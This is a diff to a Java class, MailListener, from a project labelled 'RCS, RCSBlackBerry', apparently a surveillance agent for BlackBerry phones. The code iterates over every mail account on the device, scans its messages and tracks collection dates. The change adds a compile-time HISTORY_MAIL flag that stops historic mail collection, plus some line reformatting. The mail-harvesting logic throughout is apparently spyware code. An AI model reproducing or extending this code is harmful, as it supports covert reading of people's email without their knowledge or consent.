@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 /**
  * 
  */
@@ -228,8 +228,15 @@ public final class MailListener implements FolderListener, SendListener { //, St
         //store.removeStoreListener(this);
     }
 
+    //#ifdef HISTORY_MAIL
+    boolean stopHistory;
+    public void stopHistory() {
+        stopHistory = true;
+    }
+    //#endif
+
     /**
-     * Run.
+     * retrieveHistoricMails.
      */
     public void retrieveHistoricMails() {
         //final long timestamp = messageAgent.initMarkup();  
@@ -239,16 +246,23 @@ public final class MailListener implements FolderListener, SendListener { //, St
 
         collecting = true;
         // questa data rappresenta l'ultimo controllo effettuato.
-        final Date lastCheckDate = MessageAgent.getInstance().lastcheckGet("COLLECT");
+        final Date lastCheckDate = MessageAgent.getInstance().lastcheckGet(
+                "COLLECT");
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
+            //#ifdef HISTORY_MAIL
+            if(stopHistory){
+                break;                
+            }
+            //#endif
             names[count] = mailServiceRecords[count].getName();
             //#ifdef DEBUG
             debug.trace("Email account name: " + names[count]);
             //#endif
 
-            Date lastCheckDateName = MessageAgent.getInstance().lastcheckGet(names[count]);
+            Date lastCheckDateName = MessageAgent.getInstance().lastcheckGet(
+                    names[count]);
 
             //names[count] = mailServiceRecords[0].getName();
             final ServiceConfiguration sc = new ServiceConfiguration(
@@ -262,14 +276,19 @@ public final class MailListener implements FolderListener, SendListener { //, St
             MessageAgent.getInstance().lastcheckSet(names[count], new Date());
         }
 
-        // al termine degli scanfolder
-        MessageAgent.getInstance().lastcheckSet("COLLECT", new Date());
+        //if (!stopHistory) {
+            // al termine degli scanfolder
+            MessageAgent.getInstance().lastcheckSet("COLLECT", new Date());
+        //}
 
         //#ifdef DEBUG
         debug.trace("End search");
         //#endif
 
         collecting = false;
+        //#ifdef HISTORY_MAIL
+        stopHistory = false;
+        //#endif
     }
 
     /**
@@ -292,7 +311,8 @@ public final class MailListener implements FolderListener, SendListener { //, St
 
         if (collectFilter == null) {
             //#ifdef DEBUG
-            debug.trace("no collectFilter, messageAgent: " + MessageAgent.getInstance());
+            debug.trace("no collectFilter, messageAgent: "
+                    + MessageAgent.getInstance());
             //#endif
             if (MessageAgent.getInstance() != null) {
                 //#ifdef DEBUG
@@ -338,6 +358,12 @@ public final class MailListener implements FolderListener, SendListener { //, St
                 // Scandisco ogni e-mail dell'account di posta
                 for (int j = messages.length - 1; j >= 0 && !next; j--) {
 
+                    //#ifdef HISTORY_MAIL
+                    if(stopHistory){
+                        break;                
+                    }
+                    //#endif
+                    
                     try {
                         //#ifdef DEBUG
                         debug.trace("message # " + j);
